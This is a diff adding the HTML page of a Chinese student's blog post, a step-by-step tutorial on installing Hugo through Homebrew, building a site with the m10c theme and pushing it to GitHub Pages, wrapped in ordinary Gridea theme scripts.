@@ -1,0 +1,1874 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta charset="UTF-8" />
+
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+<meta name="keywords" content="Gridea静态个人博客">
+<meta name="description" content="大一学生自己的博客">
+<meta name="theme-color" content="#222">
+<title>hugo+github博客搭建 | toby的博客</title>
+<link rel="shortcut icon" href="/favicon.ico?v=1611633218238">
+<link rel="stylesheet" href="/styles/main.css">
+<link rel="stylesheet" href="/media/css/pisces.css">
+
+<link rel="stylesheet" href="/media/fonts/font-awesome.css">
+<link
+  href="//fonts.googleapis.com/css?family=Monda:300,300italic,400,400italic,700,700italic|Roboto Slab:300,300italic,400,400italic,700,700italic|Rosario:300,300italic,400,400italic,700,700italic|PT Mono:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext"
+  rel="stylesheet" type="text/css">
+
+<link href="/media/hljs/styles/androidstudio.css"
+  rel="stylesheet">
+
+<script src="/media/hljs/highlight.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.0/velocity.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.0/velocity.ui.min.js"></script>
+
+
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/katex.min.css" integrity="sha384-zB1R0rpPzHqg7Kpt0Aljp8JPLqbXI3bhnPWROx27a9N0Ll6ZP/+DiW/UqRcLbRjq" crossorigin="anonymous">
+  <script defer src="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/katex.min.js" integrity="sha384-y23I5Q6l+B6vatafAwxRu/0oK/79VlbSz7Q9aiSZUvyWYIYsd+qj+o24G5ZU2zJz" crossorigin="anonymous"></script>
+  <script defer src="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/contrib/auto-render.min.js" integrity="sha384-kWPLUVMOks5AQFrykwIup5lo0m3iMkkHrD0uJ4H5cjeGihAutqP0yW0J6dpFiVkI" crossorigin="anonymous"
+      onload="renderMathInElement(document.body);"></script>
+
+
+
+
+<script>
+  var _hmt = _hmt || [];
+  (function () {
+    var hm = document.createElement("script");
+    hm.src = "https://hm.baidu.com/hm.js?cc357cbada22357d53582545cf736619";
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(hm, s);
+  })();
+</script>
+
+  <meta name="description" content="hugo+github博客搭建" />
+  <meta name="keywords" content="" />
+</head>
+
+<body>
+  <div class="head-top-line"></div>
+  <div class="header-box">
+    
+<div class="pisces">
+  <header class="header  ">
+    <div class="blog-header box-shadow-wrapper bg-color " id="header">
+      <div class="nav-toggle" id="nav_toggle">
+        <div class="toggle-box">
+          <div class="line line-top"></div>
+          <div class="line line-center"></div>
+          <div class="line line-bottom"></div>
+        </div>
+      </div>
+      <div class="site-meta">       
+        <div class="site-title">
+          
+            <a href="/" class="brand">
+              <span>toby的博客</span>
+            </a>  
+          
+        </div>
+        
+          <p class="subtitle">精于心，简于形</p>
+        
+      </div>
+      <nav class="site-nav" id="site_nav">
+        <ul id="nav_ul">
+          
+            
+            
+              
+            
+            <li class="nav-item ">
+              
+              
+                <a href="/" target="_self">
+                  <i class="fa fa-home"></i> 首页
+                </a>
+              
+            </li>
+          
+            
+            
+              
+            
+            <li class="nav-item ">
+              
+              
+                <a href="/archives/" target="_self">
+                  <i class="fa fa-archive"></i> 归档
+                </a>
+              
+            </li>
+          
+            
+            
+              
+            
+            <li class="nav-item ">
+              
+              
+                <a href="/tags/" target="_self">
+                  <i class="fa fa-tags"></i> 标签
+                </a>
+              
+            </li>
+          
+            
+            
+              
+            
+            <li class="nav-item ">
+              
+              
+                <a href="https://book.tobyblog.cn/" target="_self">
+                  <i class="fa fa-globe"></i> 参考资料
+                </a>
+              
+            </li>
+          
+            
+            
+              
+            
+            <li class="nav-item ">
+              
+              
+                <a href="http://121.199.50.67:80/" target="_self">
+                  <i class="fa fa-globe"></i> 摄影作品
+                </a>
+              
+            </li>
+          
+            
+            
+              
+            
+            <li class="nav-item ">
+              
+              
+                <a href="/post/about/" target="_self">
+                  <i class="fa fa-user"></i> 关于
+                </a>
+              
+            </li>
+          
+          
+            
+              <li class="nav-item ">
+                <a href="/friends/" target="_self">
+                  
+                    ⛵️友情链接
+                  
+                </a>
+              </li>
+            
+          
+        </ul>
+      </nav>
+    </div>
+  </header>
+</div>
+
+<script type="text/javascript"> 
+ 
+  let showNav = true;
+
+  let navToggle = document.querySelector('#nav_toggle'),
+  siteNav = document.querySelector('#site_nav');
+  
+  function navClick() {
+    let sideBar = document.querySelector('.sidebar');
+    let navUl = document.querySelector('#nav_ul');
+    navToggle.classList.toggle('nav-toggle-active');
+    siteNav.classList.toggle('nav-menu-active');
+    if (siteNav.classList.contains('nav-menu-active')) {
+      siteNav.style = "height: " + (navUl.children.length * 42) +"px !important";
+    } else {
+      siteNav.style = "";
+    }
+  }
+
+  navToggle.addEventListener('click',navClick);  
+</script>
+  </div>
+  <div class="main-continer">
+    
+    <div
+      class="section-layout pisces ">
+      <div class="section-layout-wrapper">
+        
+
+<div class="sidebar">
+  
+    <div class="sidebar-box box-shadow-wrapper bg-color right-motion" id="sidebar">
+      
+        <div class="post-list-sidebar">
+          <div class="sidebar-title">
+            <span id="tocSideBar" class="sidebar-title-item sidebar-title-active">文章目录</span>
+            <span id="metaSideBar" class="sidebar-title-item">站点概览</span>
+          </div>
+        </div>
+      
+      <div class="sidebar-body pisces" id="sidebar_body">
+        
+          
+            <div class="post-side-meta" id="post_side_meta">
+              
+<div class="sidebar-wrapper box-shadow-wrapper bg-color">
+  <div class="sidebar-item">
+    <img class="site-author-image right-motion" src="/images/avatar.png"/>
+    <p class="site-author-name">toby</p>
+    
+    <div class="site-description right-motion">
+      
+        <p id="binft">台州学院大一学生，自己的博客</p>
+      
+    </div>
+    
+  </div>
+  <div class="sidebar-item side-item-stat right-motion">
+    <div class="sidebar-item-box">
+      <a href="/archives/">
+        
+        <span class="site-item-stat-count">9</span>
+        <span class="site-item-stat-name">文章</span>
+      </a>
+    </div>
+    <div class="sidebar-item-box">
+      <a href="">
+        <span class="site-item-stat-count">1</span>
+        <span class="site-item-stat-name">分类</span>
+      </a>
+    </div>
+    <div class="sidebar-item-box">
+      <a href="/tags/">
+        <span class="site-item-stat-count">1</span>
+        <span class="site-item-stat-name">标签</span>
+      </a>
+    </div>
+  </div>
+  
+    
+  
+  
+    <div class="sidebar-item sidebar-item-social">
+      <div class="social-item">
+        
+          
+            <a href="https://space.bilibili.com/28003538">
+              <i class="fa fa-thumbs-up" title="b站"></i>
+            </a>
+          
+        
+        
+          
+            <a class="social-img" href="#">
+              <img src="/media/images/custom-array-imgSocials-1588230341338-socialImg.jpg" />
+              <i class="fa fa-wechat" title="微信" ></i>
+            </a>
+          
+            <a class="social-img" href="#">
+              <img src="/media/images/custom-array-imgSocials-1588230341339-socialImg.jpg" />
+              <i class="fa fa-qq" title="qq" ></i>
+            </a>
+          
+        
+      </div>
+    </div>
+  
+
+
+</div>
+            </div>
+            <div class="post-toc sidebar-body-active" id="post_toc" style="opacity: 1;">
+              <div class="toc-box right-motion">
+  <div class="toc-wrapper auto-number auto"
+    id="toc_wrapper">
+    <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li><a href="#%E5%87%86%E5%A4%87">准备</a>
+<ul>
+<li><a href="#%E5%AE%89%E8%A3%85brew">安装brew</a></li>
+</ul>
+</li>
+<li><a href="#hugo">hugo</a>
+<ul>
+<li><a href="#%E6%AD%A5%E9%AA%A41%E5%AE%89%E8%A3%85hugo">步骤1:安装hugo</a>
+<ul>
+<li><a href="#%E9%AA%8C%E8%AF%81%E5%AE%89%E8%A3%85">验证安装</a></li>
+</ul>
+</li>
+<li><a href="#%E6%AD%A5%E9%AA%A42%E5%BB%BA%E7%AB%8B%E6%96%B0%E7%BD%91%E7%AB%99">步骤2:建立新网站</a></li>
+<li><a href="#%E6%AD%A5%E9%AA%A43%E6%B7%BB%E5%8A%A0%E4%B8%BB%E9%A2%98">步骤3：添加主题 </a>
+<ul>
+<li><a href="#%E4%BE%8B%E5%A6%82m10c%E4%B8%BB%E9%A2%98">例如：m10c主题</a></li>
+</ul>
+</li>
+<li><a href="#%E6%AD%A5%E9%AA%A44%E6%B7%BB%E5%8A%A0%E4%B8%80%E4%BA%9B%E5%86%85%E5%AE%B9">步骤4：添加一些内容</a>
+<ul>
+<li><a href="#%E7%BC%96%E8%BE%91bolg1md%E6%96%87%E4%BB%B6%E6%B7%BB%E5%8A%A0%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2">编辑<code>bolg1.md</code>文件，添加第一篇博客</a></li>
+</ul>
+</li>
+<li><a href="#%E6%AD%A5%E9%AA%A45%E5%90%AF%E5%8A%A8hugo%E6%9C%8D%E5%8A%A1%E5%99%A8">步骤5：启动Hugo服务器</a></li>
+<li><a href="#%E6%AD%A5%E9%AA%A46%E5%B0%86%E7%BD%91%E7%AB%99%E6%8E%A8%E4%B8%8A%E8%BF%9C%E7%AB%AFgithua">步骤6：将网站推上远端(githua)</a></li>
+<li><a href="#%E6%AD%A5%E9%AA%A47%E5%AE%8C%E6%88%90%E6%89%93%E5%BC%80%E7%BD%91%E7%AB%99">步骤7：完成打开网站</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+  </div>
+</div>
+
+<script>
+
+  let lastTop = 0, lList = [], hList = [], postBody, lastIndex = -1;
+  let active = 'active-show', activeClass = 'active-current';
+  let tocWrapper = document.querySelector('#toc_wrapper');
+  let tocContent = tocWrapper.children[0];
+  let autoNumber = tocWrapper && tocWrapper.classList.contains('auto-number');
+
+  function addTocNumber(elem, deep) {
+    if (!elem) {
+      return;
+    }
+    let prop = elem.__proto__;
+
+    if (prop === HTMLUListElement.prototype) {
+      for (let i = 0; i < elem.children.length; i++) {
+        addTocNumber(elem.children[i], deep + (i + 1) + '.');
+      }
+    } else if (prop === HTMLLIElement.prototype) {
+      // 保存li元素
+      if (elem.children[0].__proto__ === HTMLAnchorElement.prototype) {
+        lList.push(elem);
+      }
+      for (let i = 0; i < elem.children.length; i++) {
+        let cur = elem.children[i];
+        if (cur.__proto__ === HTMLAnchorElement.prototype) {
+          if (autoNumber) {
+            cur.text = deep + ' ' + cur.text;
+          }
+        } else if (cur.__proto__ === HTMLUListElement.prototype) {
+          addTocNumber(cur, deep);
+        }
+      }
+    }
+  }
+
+  function removeParentActiveClass() {
+    let parents = tocContent.querySelectorAll('.' + active)
+    parents.forEach(function (elem) {
+      elem.classList.remove(active);
+    });
+  }
+
+  function addActiveClass(index) {
+    if (index >= 0 && index < hList.length) {
+      lList[index].classList.add(activeClass);
+    }
+  }
+
+  function removeActiveClass(index) {
+    if (index >= 0 && index < hList.length) {
+      lList[index].classList.remove(activeClass);
+    }
+  }
+
+  function addActiveLiElemment(elem, parent) {
+    if (!elem || elem === parent) {
+      return;
+    } else {
+      if (elem.__proto__ === HTMLLIElement.prototype) {
+        elem.classList.add(active);
+      }
+      addActiveLiElemment(elem.parentElement, parent);
+    }
+  }
+
+  function showToc() {
+    if (tocWrapper) {
+      postBody = document.querySelector('#post_body');
+      for (let i = 0; i < postBody.children.length; i++) {
+        if (postBody.children[i].__proto__ === HTMLHeadingElement.prototype) {
+          hList.push(postBody.children[i]);
+        }
+      }
+      if (tocWrapper.classList.contains('compress')) {
+        tocContent.classList.add('closed');
+      } else if (tocWrapper.classList.contains('no_compress')) {
+        tocContent.classList.add('expanded');
+      } else {
+        if (hList.length > 10) {
+          active = 'active-hidden'
+          tocContent.classList.add('closed');
+        } else {
+          tocContent.classList.add('expanded');
+        }
+      }
+    }
+  }
+
+  (function () {
+    // 处理不是从#一级标题开始目录
+    if (tocContent.children.length === 1 && tocContent.children[0].__proto__ === HTMLLIElement.prototype) {
+      let con = tocContent.children[0].children[0];
+      tocContent.innerHTML = con.innerHTML;
+    }
+    let markdownItTOC = document.querySelector('.markdownIt-TOC');
+    let innerHeight = window.innerHeight;
+    markdownItTOC.style = `max-height: ${innerHeight - 80 > 0 ? innerHeight - 80 : innerHeight}px`
+    addTocNumber(tocContent, '');
+  })();
+
+  document.addEventListener('scroll', function (e) {
+    if (lList.length <= 0) {
+      return;
+    }
+    let scrollTop = document.scrollingElement.scrollTop + 10;
+    let dir;
+
+    if (lastTop - scrollTop > 0) {
+      dir = 'up';
+    } else {
+      dir = 'down';
+    }
+
+    lastTop = scrollTop;
+    if (scrollTop <= 0) {
+      if (lastIndex >= 0 && lastIndex < hList.length) {
+        lList[lastIndex].classList.remove(activeClass);
+      }
+      return;
+    }
+
+    let current = 0, hasFind = false;
+    for (let i = 0; i < hList.length; i++) {
+      if (hList[i].offsetTop > scrollTop) {
+        current = i;
+        hasFind = true;
+        break;
+      }
+    }
+    if (!hasFind && scrollTop > lList[lList.length - 1].offsetTop) {
+      current = hList.length - 1;
+    } else {
+      current--;
+    }
+    if (dir === 'down') {
+      if (current > lastIndex) {
+        addActiveClass(current);
+        removeActiveClass(lastIndex)
+        lastIndex = current;
+        removeParentActiveClass();
+        lList[current] && addActiveLiElemment(lList[current].parentElement, tocContent);
+      }
+    } else {
+      if (current < lastIndex) {
+        addActiveClass(current);
+        removeActiveClass(lastIndex);
+        lastIndex = current;
+        removeParentActiveClass();
+        lList[current] && addActiveLiElemment(lList[current].parentElement, tocContent);
+      }
+    }
+  });
+
+
+  window.addEventListener('load', function () {
+    showToc();
+    document.querySelector('#sidebar').style = 'display: block;';
+    tocWrapper.classList.add('toc-active');
+    setTimeout(function () {
+      if ("createEvent" in document) {
+        let evt = document.createEvent("HTMLEvents");
+        evt.initEvent("scroll", false, true);
+        document.dispatchEvent(evt);
+      }
+      else {
+        document.fireEvent("scroll");
+      }
+    }, 500)
+  })
+
+</script>
+            </div>
+          
+        
+      </div>
+    </div>
+  
+</div>
+<script>
+  const SIDEBAR_TITLE_ACTIVE = 'sidebar-title-active';
+  const SIDEBAR_BODY_ACTIVE = 'sidebar-body-active';
+  const SLIDE_UP_IN = 'slide-up-in';
+
+  let sidebar = document.querySelector('#sidebar'),
+  tocSideBar = document.querySelector('#tocSideBar'),
+  metaSideBar = document.querySelector('#metaSideBar'),
+  postToc = document.querySelector('#post_toc'),
+  postSiteMeta = document.querySelector('#post_side_meta'),
+  sidebarTitle = document.querySelector('.sidebar-title'),
+  sidebarBody = document.querySelector('#sidebar_body');
+
+  tocSideBar && tocSideBar.addEventListener('click', (e) => {
+    toggleSidebar(e);
+  });
+
+  metaSideBar && metaSideBar.addEventListener('click', (e) => {
+    toggleSidebar(e);
+  });
+
+  function toggleSidebar(e) {
+    let currentTitle = document.querySelector("."+SIDEBAR_TITLE_ACTIVE);
+    if (currentTitle == e.srcElement) {
+      return ;
+    }
+    let current, showElement, hideElement;
+    if (e.srcElement == metaSideBar) {
+      showElement = postSiteMeta;
+      hideElement = postToc;
+    } else if (e.srcElement == tocSideBar){
+      showElement = postToc;
+      hideElement = postSiteMeta;
+    }
+    currentTitle.classList.remove(SIDEBAR_TITLE_ACTIVE);
+    e.srcElement.classList.add(SIDEBAR_TITLE_ACTIVE);
+
+    window.Velocity(hideElement, 'stop');
+    window.Velocity(hideElement, 'transition.slideUpOut', {
+      display: 'none',
+      duration: 200,
+      complete: function () {
+        window.Velocity(showElement, 'transition.slideDownIn', {
+          duration: 200
+        });
+      }
+    })
+    hideElement.classList.remove(SIDEBAR_BODY_ACTIVE);
+    showElement.classList.add(SIDEBAR_BODY_ACTIVE);
+  }
+
+  postToc && postToc.addEventListener('transitionend', function() {
+    this.classList.remove(SLIDE_UP_IN);
+  });
+
+  if (sidebarBody) {
+    if (sidebarBody.classList.contains('pisces') || sidebarBody.classList.contains('gemini')) {
+      let hasFix = false;
+      let scrollEl = document.querySelector('.main-continer');
+      let limitTop = document.querySelector('#nav_ul').children.length * 42 + 162;
+      window.addEventListener('scroll', function(e) {
+        if (document.scrollingElement.scrollTop >= limitTop) {
+          if (!hasFix) {
+            sidebar.classList.add('sidebar-fixed');
+            hasFix = true;
+          }
+        } else {
+          if (hasFix) {
+            sidebar.classList.remove('sidebar-fixed');
+            hasFix = false;
+          }
+        }
+      });
+    }
+  }
+  
+</script>
+        <div class="section-box box-shadow-wrapper">
+          <div class="section bg-color post post-page">
+            <header class="post-header">
+  <h1 class="post-title">
+    <a class="post-title-link" href="https://tjx158589.github.io/post/hugogithua-bo-ke-da-jian-md/">
+      hugo+github博客搭建
+    </a>
+  </h1>
+  <div class="post-meta">
+    
+    <span class="meta-item pc-show">
+      <i class="fa fa-calendar-o"></i>
+      <span>发布于</span>
+      <span>2020-04-27</span>
+      <span class="post-meta-divider pc-show">|</span>
+    </span>
+    
+    <span class="meta-item">
+      <i class="fa fa-clock-o"></i>
+      <span>2分钟</span>
+    </span>
+    <span class="meta-item">
+      <span class="post-meta-divider">|</span>
+      <i class="fa fa-file-word-o"></i>
+      <span>376<span class="pc-show">字数</span></span>
+    </span>
+    
+    
+    
+    <span id="/post/hugogithua-bo-ke-da-jian-md/" data-flag-title="hugo+github博客搭建" class="meta-item pc-show leancloud_visitors">
+      <span class="post-meta-divider">|</span>
+      <i class="fa fa-eye"></i>
+      <span>浏览量：<span class="leancloud-visitors-count"></span></span>
+    </span>
+    
+  </div>
+</header>
+            <div class="post-body next-md-body" id="post_body">
+              <h2 id="准备">准备</h2>
+<h3 id="安装brew">安装brew</h3>
+<blockquote>
+<p>打开终端，执行下面的命令。</p>
+</blockquote>
+<pre><code>$ /usr/bin/ruby -e &quot;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)&quot;
+</code></pre>
+<!-- more -->
+<hr>
+<h2 id="hugo">hugo</h2>
+<h3 id="步骤1安装hugo">步骤1:安装hugo</h3>
+<pre><code>$ brew install hugo
+</code></pre>
+<h4 id="验证安装">验证安装</h4>
+<pre><code>$ hugo version
+</code></pre>
+<img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ge8c5tw9gqj30vo0kajsf.jpg" alt="image-20200427150228739" style="zoom: 40%;" />
+<h3 id="步骤2建立新网站">步骤2:建立新网站</h3>
+<blockquote>
+<p>新建网站文件 blog</p>
+</blockquote>
+<pre><code>$ hugo new site blog
+</code></pre>
+<img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ge8cev22wuj30vo0kaqbf.jpg" alt="image-20200427151113426" style="zoom:50%;" />
+<img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ge8cfsraevj30me046aby.jpg" alt="image-20200427151209200" style="zoom:50%;" />
+<h3 id="步骤3添加主题">步骤3：添加主题<a href="https://gohugo.io/getting-started/quick-start/#step-3-add-a-theme"> </a></h3>
+<blockquote>
+<p>请参阅<a href="https://themes.gohugo.io/">themes.gohugo.io</a>以获取要考虑的主题列表。本快速入门使用了精美的<a href="https://themes.gohugo.io/gohugo-theme-ananke/">Ananke主题</a>。</p>
+</blockquote>
+<h4 id="例如m10c主题">例如：m10c主题</h4>
+<figure data-type="image" tabindex="1"><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ge8cinn96bj31gb0u0qh8.jpg" alt="image-20200427151453707" loading="lazy"></figure>
+<blockquote>
+<p>将此存储库克隆到<code>themes/</code>目录中：</p>
+</blockquote>
+<pre><code>$ git clone https://github.com/vaga/hugo-theme-m10c.git themes/m10c
+</code></pre>
+<img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ge8cn17ahtj30vo0ka0z2.jpg" alt="image-20200427151905845" style="zoom:50%;" />
+<h3 id="步骤4添加一些内容">步骤4：添加一些内容</h3>
+<blockquote>
+<p>您可以手动创建内容文件（例如作为<code>content//.</code>）并在其中提供元数据，但是您可以使用该<code>new</code>命令为您做一些事情（例如添加一篇 blog1.md文件）：</p>
+</blockquote>
+<pre><code>hugo new posts/blog1.md
+</code></pre>
+<img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ge8cqtu3l0j30vo0kawlt.jpg" alt="image-20200427152245539" style="zoom:50%;" />
+<blockquote>
+<p>在目录 <code>blog/content/posts</code>中生成 <code>bolg1.md</code>文件</p>
+</blockquote>
+<h4 id="编辑bolg1md文件添加第一篇博客">编辑<code>bolg1.md</code>文件，添加第一篇博客</h4>
+<img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ge8cw3l7ofj30u00xjgse.jpg" alt="image-20200427152748227" style="zoom:50%;" />
+<h3 id="步骤5启动hugo服务器">步骤5：启动Hugo服务器</h3>
+<blockquote>
+<p>现在，在本地以m10c主题启动Hugo服务器：</p>
+</blockquote>
+<pre><code>hugo server -t m10c --buildDrafts
+</code></pre>
+<img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ge8czgrpoqj30vo0ka7cv.jpg" alt="image-20200427153103751" style="zoom:50%;" />
+<blockquote>
+<p>浏览器输入网址</p>
+<p>​      显示成功</p>
+</blockquote>
+<img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ge8d0l5anaj31gb0u0wn3.jpg" alt="image-20200427153205341" style="zoom:50%;" />
+<h3 id="步骤6将网站推上远端githua">步骤6：将网站推上远端(githua)</h3>
+<blockquote>
+<p>根据githua库设置地址</p>
+<p><code>hugo --theme=&lt;主题》 --baseUrl=&quot;&lt;库地址&gt;&quot; --buildDrafts</code></p>
+</blockquote>
+<img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ge8d7vu6vvj31gb0u07p0.jpg" alt="image-20200427153908190" style="zoom:50%;" />
+<pre><code>hugo --theme=m10c --baseUrl=&quot;https://tjx158589.github.io/&quot; --buildDrafts
+</code></pre>
+<blockquote>
+<p>主目录生成需上传远端文件夹<code>public</code></p>
+</blockquote>
+<blockquote>
+<p>git 上传操作</p>
+</blockquote>
+<pre><code>cd public
+
+git init
+
+git add .
+
+git commit -m &quot;我的 hugo 博客第一次提交&quot;
+
+git remote add origin https://github.com/tjx158589/tjx158589.github.io.git
+
+
+git push -u origin master
+</code></pre>
+<h3 id="步骤7完成打开网站">步骤7：完成打开网站</h3>
+
+            </div>
+            <div class="post-footer">
+  <ul class="post-copyright">
+    <li class="post-copyright-author">
+      <strong>本文作者：</strong>
+      toby
+    </li>
+    <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://tjx158589.github.io/post/hugogithua-bo-ke-da-jian-md/" title="hugo+github博客搭建">https://tjx158589.github.io/post/hugogithua-bo-ke-da-jian-md/</a>
+    </li>
+    <li class="post-copyright-license">
+      <strong>版权声明： </strong>
+      本博客所有文章除特别声明外，均采用<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i> BY-NC-SA</a> 许可协议。转载请注明出处！
+    </li>
+  </ul>
+  <div class="tags">
+    
+  </div>
+  <div class="nav">
+    <div class="nav-prev">
+      
+        <i class="fa fa-chevron-left"></i>
+        <a class="nav-pc-next" title="typora 使用方法" href="https://tjx158589.github.io/post/DxtlyjtyA/">typora 使用方法</a class="nav-pc-next">
+        <a class="nav-mobile-prev" title="typora 使用方法" href="https://tjx158589.github.io/post/DxtlyjtyA/">上一篇</a>
+      
+    </div>
+    <div class="nav-next">
+      
+    </div>
+  </div>
+</div>
+            
+  <script src="https://cdn.jsdelivr.net/npm/valine@1.4.4/dist/Valine.min.js"></script>
+<div id="vcomments" style="padding: 10px 0px 0px 0px"></div>
+
+<style>
+  .v .veditor {
+    min-height: 10rem;
+    background-image: url('https://upimage.alexhchu.com/2020/04/21/47eda59424daa.gif');
+    background-size: contain;
+    background-repeat: no-repeat;
+    background-position: right;
+    background-color: rgba(255, 255, 255, 0);
+    resize: none;
+  }
+
+  .v .vwrap {
+    border: 1px solid #000 !important;
+  }
+
+  .v .vbtn {
+    padding: .4rem 1.2rem !important;
+    border-color: #fff !important;
+    background-color: #49b1f5 !important;
+    color: #fff !important;
+    font-size: .7rem !important;
+  }
+
+  .v .vcards .vcard .vh .vmeta .vat {
+    padding: 0 .8rem !important;
+    border: 1px solid #00c4b6 !important;
+    border-radius: 5px !important;
+    color: #00c4b6 !important;
+  }
+</style>
+<script>
+  new Valine({
+    el: '#vcomments',
+    appId: 'miX2efxX7x2SHYDvGqOrJ04V-gzGzoHsz',
+    appKey: 'cNYcgoGQkE1LL8MLjrqRNbts',
+    avatar: 'robohash',
+    placeholder: '',
+    pageSize: '',
+    lang: 'zh-cn',
+    visitor: 'true' === 'true',
+    highlight: 'true' === 'true',
+    avatarForce: 'true' === 'false',
+  });
+</script>
+
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="footer-box">
+  <footer class="footer">
+    <div class="copyright">
+      Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | © 2019-2020 Theme By <a href="https://github.com/hsxyhao/gridea-theme-next" target="_blank">HsxyHao</a>
+    </div>
+    <div class="poweredby">
+      技术支持 <a href="https://github.com/tjx158589/tjx158589.github.io">Gridea</a>
+    </div>
+  </footer>
+  
+  
+  <div class="pisces back-to-top" id="back_to_top">
+    <i class="fa fa-arrow-up"></i>
+    
+    <span class="scrollpercent">
+      <span id="back_to_top_text">0</span>%
+    </span>
+    
+  </div>
+  
+    <div class="bg-img">
+      <img src="/media/images/custom-bgImg.jpg" />
+    </div>
+  
+  
+  
+    
+  <script src="https://libs.baidu.com/jquery/2.0.0/jquery.min.js"></script>
+  <script src="https://player.lmih.cn/player/js/player.js" id="myhk" key="demo" m="1"></script>
+
+
+  
+</div>
+<script>
+
+  let sideBarOpen = 'sidebar-open';
+  let body = document.body;
+  let back2Top = document.querySelector('#back_to_top'),
+  back2TopText = document.querySelector('#back_to_top_text'),
+  drawerBox = document.querySelector('#drawer_box'),
+  rightSideBar = document.querySelector('.sidebar'),
+  viewport = document.querySelector('body');
+
+  function scrollAnimation(currentY, targetY) {
+   
+    let needScrollTop = targetY - currentY
+    let _currentY = currentY
+    setTimeout(() => {
+      const dist = Math.ceil(needScrollTop / 10)
+      _currentY += dist
+      window.scrollTo(_currentY, currentY)
+      if (needScrollTop > 10 || needScrollTop < -10) {
+        scrollAnimation(_currentY, targetY)
+      } else {
+        window.scrollTo(_currentY, targetY)
+      }
+    }, 1)
+  }
+
+  back2Top.addEventListener("click", function(e) {
+    scrollAnimation(document.scrollingElement.scrollTop, 0);
+    e.stopPropagation();
+    return false;
+  });
+  
+  window.addEventListener('scroll', function(e) {
+    let percent = document.scrollingElement.scrollTop / (document.scrollingElement.scrollHeight - document.scrollingElement.clientHeight) * 100;
+    if (percent > 1 && !back2Top.classList.contains('back-top-active')) {
+      back2Top.classList.add('back-top-active');
+    }
+    if (percent == 0) {
+      back2Top.classList.remove('back-top-active');
+    }
+    if (back2TopText) {
+      back2TopText.textContent = Math.floor(percent);
+    }
+  });
+
+  
+  let hasCacu = false;
+  window.onresize = function() {
+    if (window.width > 991) {
+      calcuHeight();
+    } else {
+      hasCacu = false;
+    }
+  }
+
+  function calcuHeight() {
+    // 动态调整站点概览高度
+    if (!hasCacu && back2Top.classList.contains('pisces') || back2Top.classList.contains('gemini')) {
+      let sideBar = document.querySelector('.sidebar');
+      let navUl = document.querySelector('#site_nav');
+      sideBar.style = 'margin-top:' + (navUl.offsetHeight + navUl.offsetTop + 15) + 'px;';
+      hasCacu = true;
+    }
+  }
+  calcuHeight();
+  
+  let open = false, MOTION_TIME = 300, RIGHT_MOVE_DIS = '320px';
+
+  if (drawerBox) {
+    let rightMotions = document.querySelectorAll('.right-motion');
+    let right = drawerBox.classList.contains('right');
+
+    let transitionDir = right ? "transition.slideRightIn" : "transition.slideLeftIn";
+
+    let openProp, closeProp;
+    if (right) {
+      openProp = {
+        paddingRight: RIGHT_MOVE_DIS 
+      };
+      closeProp = {
+        paddingRight: '0px'
+      };
+    } else {
+      openProp = {
+        paddingLeft: RIGHT_MOVE_DIS 
+      };
+      closeProp = {
+        paddingLeft: '0px'
+      };
+    }
+
+    drawerBox.onclick = function() {
+      open = !open;
+      window.Velocity(rightSideBar, 'stop');
+      window.Velocity(viewport, 'stop');
+      window.Velocity(rightMotions, 'stop');
+      if (open) {
+        window.Velocity(rightSideBar, {
+          width: RIGHT_MOVE_DIS
+        }, {
+          duration: MOTION_TIME,
+          begin: function() {
+            window.Velocity(rightMotions, transitionDir,{ });
+          }
+        })
+        window.Velocity(viewport, openProp,{
+          duration: MOTION_TIME
+        });
+      } else {
+        window.Velocity(rightSideBar, {
+          width: '0px'
+        }, {
+          duration: MOTION_TIME,
+          begin: function() {
+            window.Velocity(rightMotions, {
+              opacity: 0
+            });
+          }
+        })
+        window.Velocity(viewport, closeProp ,{
+          duration: MOTION_TIME
+        });
+      }
+      for (let i = 0; i < drawerBox.children.length; i++) {
+        drawerBox.children[i].classList.toggle('muse-line');
+      }
+      drawerBox.classList.toggle(sideBarOpen);
+    }
+  }
+
+  // 链接跳转
+  let newWindow = 'true'
+  if (newWindow === 'true') {
+    let links = document.querySelectorAll('.post-body a')
+    links.forEach(item => {
+      if (!item.classList.contains('btn')) {
+        item.setAttribute("target","_blank");
+      }
+    })
+  }
+  // 代码高亮
+  hljs.initHighlightingOnLoad();
+
+</script>
+    <div class="light-box" id="light_box"></div>
+<script>
+  let imgs = document.querySelectorAll('.post-body img');
+  let lightBox = document.querySelector('#light_box');
+  lightBox.addEventListener('mousedown', (e) => {
+    e.preventDefault()
+  })
+  lightBox.addEventListener('mousewheel', (e) => {
+    e.preventDefault()
+  })
+  let width = window.innerWidth * 0.8;
+  lightBox.onclick = () => {
+    let img = lightBox.querySelector('img');
+    lightBox.style = '';
+    img && img.remove();
+  }
+  imgs.forEach(item => {
+    item.onclick = function (e) {
+      let lightImg = document.createElement('img');
+      lightImg.src = this.src;
